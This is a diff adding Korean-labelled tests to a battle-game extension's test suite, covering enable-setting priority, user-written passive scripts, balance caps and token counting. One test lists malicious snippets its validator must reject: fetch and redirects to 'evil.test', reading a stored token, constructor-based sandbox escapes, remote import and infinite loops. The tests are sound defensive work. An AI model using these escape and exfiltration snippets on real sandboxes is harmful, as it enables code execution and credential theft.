@@ -949,6 +949,319 @@ const pkSheet = (o, side = 'enemy') => C.normalizeSheet({ hp: 500, sp: 200, stat
   assert.ok(mage.stats.INT - mage.stats.STR >= 85, 'same-tier characters must preserve strong stat specialization');
 });
 
+/* 53 */ await test('챗/캐릭터별 활성화 우선순위: 전역 off > 채팅 설정 > 캐릭터 설정 > 옵트인 > 기본', () => {
+  // Default ON
+  assert.equal(G.resolveEnabled({ settings: { enabled: true }, state: {}, charKey: 'a.png', charName: '앨리스' }).enabled, true);
+  // Global OFF overrides chat ON and char ON
+  assert.equal(G.resolveEnabled({ settings: { enabled: false, charEnabled: { 'a.png': 'on' } }, state: { chatEnabled: 'on' }, charKey: 'a.png' }).enabled, false);
+  // Per-character OFF disables chats for that character
+  const rCharOff = G.resolveEnabled({ settings: { enabled: true, charEnabled: { 'a.png': 'off' } }, state: {}, charKey: 'a.png' });
+  assert.equal(rCharOff.enabled, false);
+  assert.equal(rCharOff.reason, 'char-off');
+  // Per-chat ON overrides per-character OFF
+  const rChatOverride = G.resolveEnabled({ settings: { enabled: true, charEnabled: { 'a.png': 'off' } }, state: { chatEnabled: 'on' }, charKey: 'a.png' });
+  assert.equal(rChatOverride.enabled, true);
+  assert.equal(rChatOverride.reason, 'chat-on');
+  // Per-chat OFF overrides per-character ON
+  const rChatOff = G.resolveEnabled({ settings: { enabled: true, charEnabled: { 'a.png': 'on' } }, state: { chatEnabled: 'off' }, charKey: 'a.png' });
+  assert.equal(rChatOff.enabled, false);
+  assert.equal(rChatOff.reason, 'chat-off');
+  // Opt-in global default: OFF until activated, unless character is explicitly ON
+  assert.equal(G.resolveEnabled({ settings: { enabled: true, optIn: true }, state: {}, charKey: 'b.png' }).enabled, false);
+  assert.equal(G.resolveEnabled({ settings: { enabled: true, optIn: true, charEnabled: { 'b.png': 'on' } }, state: {}, charKey: 'b.png' }).enabled, true);
+  // Legacy state.disabled & settings.exclude backward compatibility
+  assert.equal(G.resolveEnabled({ settings: { enabled: true }, state: { disabled: true }, charKey: 'a.png' }).enabled, false);
+  assert.equal(G.resolveEnabled({ settings: { enabled: true, exclude: '일상봇, 비서' }, state: {}, charKey: 'x.png', charName: '일상봇' }).enabled, false);
+});
+
+/* 54 */ await test('고유 부가효과 정적 보안 검사: XSS·샌드박스 탈출·무한루프·비결정성 전부 차단', async () => {
+  const PV = await import(here + 'passive.js');
+  const malicious = [
+    "window.location = 'https://evil.test'",
+    "fetch('https://evil.test', { method: 'POST' })",
+    "localStorage.getItem('token')",
+    "eval('alert(1)')",
+    "Function('return window')()",
+    "({}).constructor.constructor('return globalThis')()",
+    "ctx['con' + 'structor']",
+    "const k = 'constructor'; ctx[k]",
+    "globalThis.SillyTavern",
+    "while (true) { fx.heal(1); }",
+    "for (let i = 0; i < 9999999; i++) {}",
+    "const f = () => fx.heal(1);",
+    "function loop() { loop(); }",
+    "if (Math.random() < 0.5) fx.dmgMul(1.2);",
+    "const s = `hello ${ctx.turn}`;",
+    "this.constructor",
+    "ctx.__proto__",
+    "new Proxy(ctx, {})",
+    "Reflect.get(ctx, 'self')",
+    "import('https://evil.test/x.js')",
+    "const { 'constructor': F } = ctx.rng; F('return 1')();",
+    "const { ['con' + 'structor']: F } = ctx.rng;",
+    "let F; ({ 'constructor': F } = ctx.rng);",
+    "const [a] = ctx.self.elements;",
+    "const s = 'a'.repeat(99999999);",
+    "const a = Array(99999999);",
+    "const p = 'x'.padStart(9999999, '0');",
+    "w\\u0069ndow.alert(1)",
+    "const x = self;",
+    "self.location = 'x'",
+  ];
+  for (const code of malicious) {
+    const r = PV.validatePassiveCode(code);
+    assert.equal(r.ok, false, `malicious payload MUST be rejected: ${code}`);
+  }
+  const safe = `
+    if (ctx.hook === 'beforeAttack' && ctx.skill && ctx.skill.kind === 'physical') {
+      const s = ctx.mem.stacks || 0;
+      if (s > 0) fx.dmgMul(1 + s * 0.08, '검기 방출');
+    }
+    if (ctx.hook === 'afterAttack' && ctx.skill && ctx.skill.kind === 'physical') {
+      const next = Math.min(4, (ctx.mem.stacks || 0) + 1);
+      fx.flag('stacks', next);
+      if (next === 4) fx.stage('self', 'spd', 1, '검기 완성');
+    }
+  `;
+  const ok = PV.validatePassiveCode(safe);
+  assert.equal(ok.ok, true, `valid passive must pass: ${ok.error}`);
+  const dry = PV.testPassive({ name: '검기 축적', code: safe });
+  assert.equal(dry.ok, true, `dry-run must pass: ${dry.error}`);
+  assert.ok(dry.triggeredHooks.includes('afterAttack'), 'dry-run should detect triggered hooks');
+});
+
+/* 55 */ await test('고유 부가효과 전투 적용: 스택 누적·치명상 1회 버티기·밸런스 상한 클램핑·서술 출력', async () => {
+  const N = await import(here + 'narrate.js');
+  // 1) Sword-aura stacking & balance clamping (dmgMul(99) clamped to 1.45)
+  const p1 = hero();
+  p1.customPassive = {
+    name: '검기 축적',
+    desc: '물리 공격마다 스택 누적, 피해 증폭',
+    enabled: true, valid: true,
+    code: `
+      if (ctx.hook === 'beforeAttack' && ctx.skill && ctx.skill.kind === 'physical') {
+        const s = ctx.mem.stacks || 0;
+        if (s > 0) fx.dmgMul(99, '극대 검기');
+      }
+      if (ctx.hook === 'afterAttack' && ctx.skill && ctx.skill.kind === 'physical') {
+        fx.flag('stacks', (ctx.mem.stacks || 0) + 1);
+        fx.heal(999, '과다 회복 시도');
+      }
+    `,
+  };
+  const foe = C.normalizeSheet({ name: '허수아비', tier: 'C', hp: 5000, sp: 100, stats: { STR: 10, INT: 10, AGI: 5, END: 40, SEN: 20, LUK: 10 }, skills: ['찌르기: 물리 20'] }, PROFILE, { side: 'enemy' });
+  const b0 = E.createBattle({ party: [p1], enemies: [foe], profile: PROFILE, seed: 'cp-test-1', customPassives: true });
+  b0.fighters[0].hp = 300; // 50% HP so heal can be measured
+  const r1 = E.resolveTurn(b0, [{ actor: b0.fighters[0].id, type: 'skill', skill: '섬광 베기', target: b0.fighters[1].id }]);
+  const f1 = r1.battle.fighters[0];
+  assert.equal(f1.pstate.stacks, 1, 'afterAttack must persist stacks in pstate');
+  // Heal was requested at 999% but engine clamps to <=20% of maxHp (120 HP)
+  assert.ok(f1.hp <= 300 + Math.round(f1.maxHp * 0.21), `heal must be clamped to <=20% maxHp (got hp ${f1.hp}/${f1.maxHp})`);
+  // Turn 2: beforeAttack triggers dmgMul(99) -> clamped to 1.45x (cannot deal absurd 5000+ damage)
+  const r2 = E.resolveTurn(r1.battle, [{ actor: f1.id, type: 'skill', skill: '섬광 베기', target: r1.battle.fighters[1].id }]);
+  const hit2 = r2.events.find(e => e.t === 'hit' && e.who === f1.name);
+  assert.ok(r2.events.some(e => e.t === 'passive' && e.name === '검기 축적'), 'passive event must be emitted');
+  assert.ok(hit2 && hit2.dmg < 1000, `dmgMul(99) must be clamped by engine (got ${hit2?.dmg})`);
+  const lines = N.pkLines(r2.events, PROFILE);
+  assert.ok(lines.some(l => l.includes('검기 축적')), 'pkLines must render custom passive trigger');
+
+  // 2) Phoenix endure + heal: survive fatal hit at 1 HP then heal 18% maxHp, strictly once per battle
+  const phoenix = hero();
+  phoenix.customPassive = {
+    name: '불사조의 잔불', enabled: true, valid: true,
+    code: `if (ctx.hook === 'beforeHit' && ctx.fatal) { fx.endure('불사조의 가호'); fx.heal(18, '잔불 재생'); }`,
+  };
+  const boss = C.normalizeSheet({ name: '파괴자', tier: 'S', hp: 5000, sp: 100, stats: { STR: 400, INT: 10, AGI: 200, END: 100, SEN: 100, LUK: 10 }, skills: ['멸살격: 물리 120 명중100'] }, PROFILE, { side: 'enemy' });
+  const bp0 = E.createBattle({ party: [phoenix], enemies: [boss], profile: PROFILE, seed: 'cp-phoenix', customPassives: true });
+  bp0.fighters[0].hp = 50; // low HP so Focus Sash does not apply, only phoenix endure does
+  bp0.intents[bp0.fighters[1].id] = { type: 'skill', skill: '멸살격', target: bp0.fighters[0].id };
+  const pr1 = E.resolveTurn(bp0, [{ actor: bp0.fighters[0].id, type: 'guard' }]);
+  const expectedAfterEndure = 1 + Math.round(pr1.battle.fighters[0].maxHp * 0.18);
+  assert.equal(pr1.battle.fighters[0].hp, expectedAfterEndure, `phoenix endure+heal must survive at 1 HP then heal 18% (expected ${expectedAfterEndure}, got ${pr1.battle.fighters[0].hp})`);
+  assert.equal(pr1.battle.fighters[0].pstate.__endured, true, 'endure once-per-battle flag must be set');
+  // Second fatal hit in the same battle MUST KO (1/battle limit enforced by engine even if script omits flag check!)
+  pr1.battle.intents[pr1.battle.fighters[1].id] = { type: 'skill', skill: '멸살격', target: pr1.battle.fighters[0].id };
+  const pr2 = E.resolveTurn(pr1.battle, [{ actor: pr1.battle.fighters[0].id, type: 'guard' }]);
+  assert.equal(pr2.battle.fighters[0].down, true, 'second fatal hit must KO despite script calling fx.endure again');
+});
+
+/* 56 */ await test('고유 부가효과 챗별 옵트인 ON/OFF: 채팅에서 켜기 전엔 실행되지 않는다', () => {
+  const s = G.stateOf({});
+  assert.equal(s.customPassives, false, 'per-chat customPassives must default to OFF');
+  s.profile = PROFILE;
+  s.player = hero();
+  s.player.customPassive = {
+    name: '개전 기합', enabled: true, valid: true,
+    code: `if (ctx.hook === 'battleStart') { fx.stage('self', 'pow', 1, '기합'); }`,
+  };
+  // Chat OFF (default) -> passive MUST NOT run
+  const bOff = G.beginBattle(s, { mode: 'party', title: 'off-test', enemies: [{ name: '슬라임', hp: 300, stats: { STR: 20, END: 20, AGI: 20 }, skills: ['박치기: 물리 30'] }] },
+    { originIndex: 0, originHash: 'h1', settings: { ...SET, customPassives: true } });
+  assert.equal(bOff.st.customPassives, false);
+  assert.equal(bOff.st.fighters[0].stages.pow ?? 0, 0, 'passive must NOT trigger when chat customPassives is OFF');
+
+  // Chat explicitly turned ON -> passive runs at battleStart
+  s.battle = null;
+  s.customPassives = true;
+  const bOn = G.beginBattle(s, { mode: 'party', title: 'on-test', enemies: [{ name: '슬라임', hp: 300, stats: { STR: 20, END: 20, AGI: 20 }, skills: ['박치기: 물리 30'] }] },
+    { originIndex: 1, originHash: 'h2', settings: { ...SET, customPassives: true } });
+  assert.equal(bOn.st.customPassives, true);
+  assert.equal(bOn.st.fighters[0].stages.pow, 1, 'passive MUST trigger once user activates it for this chat');
+});
+
+/* 57 */ await test('다중 캐릭터 성향 시뮬 + 다단히트/AOE 턴당 상한 방어: 광전사·암살자·가시탱커·시간술사', async () => {
+  const PV = await import(here + 'passive.js');
+  // Archetype A: Berserker (low HP dmg scale + onAllyDown rage + turnEnd regen when low)
+  const berserker = C.normalizeSheet({
+    name: '카인', tier: 'A', elements: ['물리'], hp: 700, sp: 100,
+    stats: { STR: 130, INT: 20, AGI: 80, END: 70, SEN: 40, LUK: 50 },
+    skills: ['혈월 난무: 물리 25 4연타 SP15'],
+  }, PROFILE, { side: 'ally' });
+  berserker.customPassive = PV.normalizeCustomPassive({
+    name: '피의 광기', desc: '체력이 낮을수록 공격력 증폭, 아군 전사 시 분노, 공격마다 기력/공격력 증가 시도',
+    code: `
+      if (ctx.hook === 'beforeAttack' && ctx.self.hpPct < 50) { fx.dmgMul(1.35, '광폭화'); }
+      if (ctx.hook === 'afterAttack') { fx.stage('self', 'pow', 1, '전투 흥분'); fx.sp(20, '피의 갈증'); }
+      if (ctx.hook === 'onAllyDown') { fx.stage('self', 'pow', 2, '복수심'); fx.stage('self', 'spd', 1); }
+    `,
+  });
+  assert.equal(PV.testPassive(berserker.customPassive).ok, true);
+
+  // Archetype B: Thorn Tank (reduced damage on melee + counter on afterHit)
+  const tank = C.normalizeSheet({
+    name: '아이기스', tier: 'A', elements: ['강철'], hp: 1500, sp: 100,
+    stats: { STR: 60, INT: 40, AGI: 35, END: 130, SEN: 100, LUK: 30 },
+    skills: ['방패 강타: 물리 45 SP10'],
+  }, PROFILE, { side: 'enemy' });
+  tank.customPassive = PV.normalizeCustomPassive({
+    name: '가시 성벽', desc: '근접 피격 피해 -20%, 근접 피격마다 15% 반사 피해',
+    code: `
+      if (ctx.hook === 'beforeHit' && ctx.skill && ctx.skill.range === 'melee') { fx.dmgMul(0.8, '성벽 방어'); }
+      if (ctx.hook === 'afterHit' && ctx.attacker && ctx.skill && ctx.skill.range === 'melee') { fx.counter(15, '가시 반사'); }
+    `,
+  });
+  assert.equal(PV.testPassive(tank.customPassive).ok, true);
+
+  // Multi-hit exploit test: 4-hit move against Thorn Tank
+  const b = E.createBattle({ party: [berserker], enemies: [tank], profile: PROFILE, seed: 'sim-multi', customPassives: true });
+  b.fighters[0].sp = 40;
+  const startHp = b.fighters[0].hp;
+  const r1 = E.resolveTurn(b, [{ actor: b.fighters[0].id, type: 'skill', skill: '혈월 난무', target: b.fighters[1].id }]);
+  const fAtk = r1.battle.fighters[0];
+  // Per-turn caps MUST prevent 4-hit skill from granting +4 stages, +80% SP, or taking 60% counter damage!
+  assert.ok((fAtk.stages.pow ?? 0) <= 2, `multi-hit passive stage cap must be <=2/turn (got ${fAtk.stages.pow})`);
+  const counterHits = r1.events.filter(e => e.t === 'hit' && e.label === '가시 성벽');
+  const totalCounterDmg = counterHits.reduce((s, e) => s + e.dmg, 0);
+  assert.ok(totalCounterDmg <= Math.round(fAtk.maxHp * 0.21), `thorn tank counter dmg vs 4-hit must be capped <=20% maxHp/turn (got ${totalCounterDmg}/${fAtk.maxHp})`);
+  assert.ok(fAtk.hp > 0 && startHp >= fAtk.hp, 'attacker survives bounded counter');
+
+  // Archetype C: Assassin (dmgFlat vs poisoned + onKill momentum) & D: Chronomancer (odd/even turn aura)
+  const assassin = C.normalizeSheet({
+    name: '녹스', tier: 'A', elements: ['독'], hp: 600, sp: 100,
+    stats: { STR: 140, INT: 40, AGI: 140, END: 50, SEN: 60, LUK: 100 },
+    skills: ['암습: 물리 95 명중100 SP15'],
+  }, PROFILE, { side: 'ally' });
+  assassin.customPassive = PV.normalizeCustomPassive({
+    name: '신경독 처형', desc: '중독 적에게 추가 고정 피해 10%, 적 처치 시 기력 25% 회복·스피드 상승',
+    code: `
+      if (ctx.hook === 'beforeAttack' && ctx.hasStatus('target', 'poison')) { fx.dmgFlat(10, '독성 폭발'); }
+      if (ctx.hook === 'onKill') { fx.sp(25, '암살자의 여유'); fx.stage('self', 'spd', 1, '신출귀몰'); }
+    `,
+  });
+  const chrono = C.normalizeSheet({
+    name: '아스트라', tier: 'A', elements: ['빛'], hp: 550, sp: 140,
+    stats: { STR: 20, INT: 110, AGI: 90, END: 60, SEN: 100, LUK: 70 },
+    skills: ['시간의 모래: 마법 45 SP12'],
+  }, PROFILE, { side: 'ally' });
+  chrono.customPassive = PV.normalizeCustomPassive({
+    name: '시계태엽 공명', desc: '홀수 턴에 아군 전체 가속, 짝수 턴 종료 시 적 전체 감속',
+    code: `
+      if (ctx.hook === 'turnStart' && ctx.turn % 2 === 1) { fx.stage('allies', 'spd', 1, '시간 가속'); }
+      if (ctx.hook === 'turnEnd' && ctx.turn % 2 === 0) { fx.stage('foes', 'spd', -1, '시간 감속'); }
+    `,
+  });
+  assert.equal(PV.testPassive(assassin.customPassive).ok, true);
+  assert.equal(PV.testPassive(chrono.customPassive).ok, true);
+
+  const weakFoe = C.normalizeSheet({ name: '고블린 척후', tier: 'E', hp: 100, sp: 0, stats: { STR: 20, END: 10, AGI: 10 }, skills: ['찌르기: 물리 20'] }, PROFILE, { side: 'enemy' });
+  const bossFoe = C.normalizeSheet({ name: '오크 대장', tier: 'B', hp: 1200, sp: 80, stats: { STR: 80, END: 60, AGI: 30 }, skills: ['내려치기: 물리 50'] }, PROFILE, { side: 'enemy' });
+  const b2 = E.createBattle({ party: [assassin, chrono], enemies: [weakFoe, bossFoe], profile: PROFILE, seed: 'sim-party', customPassives: true });
+  b2.fighters[0].sp = 50;
+  b2.fighters[2].statuses.push({ id: 'poison', turns: 2 });
+  const pr = E.resolveTurn(b2, [
+    { actor: b2.fighters[0].id, type: 'skill', skill: '암습', target: b2.fighters[2].id },
+    { actor: b2.fighters[1].id, type: 'guard' },
+  ]);
+  // Turn 1 odd: Chronomancer hastened allies (+1 spd), Assassin killed goblin -> onKill (+1 spd more = +2 total, +25% SP)
+  assert.equal(pr.battle.fighters[2].down, true, 'weak goblin should be killed');
+  assert.equal(pr.battle.fighters[0].stages.spd, 2, 'assassin should have +1 from chrono turnStart +1 from onKill');
+  assert.ok(pr.battle.fighters[0].sp > 50, 'assassin onKill should recover SP');
+  // Turn 2 even: Chronomancer turnEnd slows surviving foes
+  const pr2 = E.resolveTurn(pr.battle, [
+    { actor: pr.battle.fighters[0].id, type: 'guard' },
+    { actor: pr.battle.fighters[1].id, type: 'guard' },
+  ]);
+  assert.equal(pr2.battle.fighters[3].stages.spd, -1, 'chronomancer even-turn turnEnd should slow surviving enemy');
+});
+
+/* 58 */ await test('턴별 입출력 토큰 측정·기록: API usage 파싱 + 원격 Gemini countTokens + ST Gemma 토크나이저 + 누적 집계', async () => {
+  const TK = await import(here + 'tokens.js');
+  // 1) Provider usage parsing (OpenAI + Gemini usageMetadata + Anthropic)
+  assert.deepEqual(TK.extractUsage({ usage: { prompt_tokens: 1200, completion_tokens: 340, completion_tokens_details: { reasoning_tokens: 90 } } }),
+    { inTok: 1200, outTok: 340, reasonTok: 90, source: 'api' });
+  assert.deepEqual(TK.extractUsage({ usageMetadata: { promptTokenCount: 2500, candidatesTokenCount: 410, thoughtsTokenCount: 150 } }),
+    { inTok: 2500, outTok: 410, reasonTok: 150, source: 'api' });
+  assert.deepEqual(TK.extractUsage({ usage: { input_tokens: 800, output_tokens: 200 } }),
+    { inTok: 800, outTok: 200, reasonTok: 0, source: 'api' });
+  assert.equal(TK.extractUsage({}), null);
+
+  // 2) Remote Gemini countTokens API call
+  let calledUrl = '';
+  const mockGeminiFetch = async (url) => {
+    calledUrl = url;
+    return { ok: true, json: async () => ({ totalTokens: 777 }) };
+  };
+  const rGem = await TK.countText('안녕하세요 Gemini 테스트', { tokenizerMode: 'gemini', geminiTokenKey: 'AIzaTestKey', geminiTokenModel: 'gemini-2.5-flash' }, { fetchFn: mockGeminiFetch, skipCache: true });
+  assert.equal(rGem.tokens, 777);
+  assert.equal(rGem.source, 'gemini');
+  assert.ok(calledUrl.includes('models/gemini-2.5-flash:countTokens?key=AIzaTestKey'), 'must hit Gemini countTokens endpoint');
+
+  // 3) ST built-in Gemma tokenizer (/api/tokenizers/gemma/encode)
+  let gemmaUrl = '';
+  const mockGemmaFetch = async (url) => {
+    gemmaUrl = url;
+    return { ok: true, json: async () => ({ count: 42, ids: new Array(42).fill(1) }) };
+  };
+  const rGemma = await TK.countText('Gemma 토크나이저 테스트', { tokenizerMode: 'auto' }, { fetchFn: mockGemmaFetch, skipCache: true });
+  assert.equal(rGemma.tokens, 42);
+  assert.equal(rGemma.source, 'gemma');
+  assert.equal(gemmaUrl, '/api/tokenizers/gemma/encode');
+
+  // 4) Fallback to ST getTokenCountAsync, then offline heuristic
+  const rSt = await TK.countText('ST 내장 카운터', { tokenizerMode: 'st' }, { stCtx: { getTokenCountAsync: async () => 19 }, skipCache: true });
+  assert.equal(rSt.tokens, 19);
+  assert.equal(rSt.source, 'st');
+  const rEst = await TK.countText('오프라인 추정 폴백 테스트 문자열', { tokenizerMode: 'est' }, { skipCache: true });
+  assert.equal(rEst.source, 'est');
+  assert.ok(rEst.tokens > 0);
+
+  // 5) Per-turn + chat cumulative accounting
+  const st = G.stateOf({});
+  TK.recordTokenUsage(st, { kind: 'main', label: '메인 턴 (#1)', inTok: 1500, outTok: 300, injectTok: 280, source: 'gemma' });
+  TK.recordTokenUsage(st, { kind: 'aux', label: '전투 구성', inTok: 600, outTok: 200, reasonTok: 50, source: 'api', sameTurn: true });
+  assert.equal(st.tokenStats.lastTurn.inTok, 2100);
+  assert.equal(st.tokenStats.lastTurn.outTok, 500);
+  assert.equal(st.tokenStats.lastTurn.reasonTok, 50);
+  assert.equal(st.tokenStats.lastTurn.injectTok, 280);
+  assert.equal(st.tokenStats.lastTurn.auxCalls, 1);
+  assert.equal(st.tokenStats.total.inTok, 2100);
+  assert.equal(st.tokenStats.total.outTok, 500);
+  assert.equal(st.tokenStats.log.length, 2);
+  TK.resetTokenStats(st);
+  assert.equal(st.tokenStats.total.inTok, 0);
+  assert.equal(st.tokenStats.log.length, 0);
+});
+
 for (const [mark, name, err] of results) console.log(`${mark} ${name}${err ? `\n    ${err}` : ''}`);
 const failed = results.filter(r => r[0] === '✖').length;
 console.log(failed ? `\n${failed}개 실패` : `\n전부 통과 (${results.length}개)`);
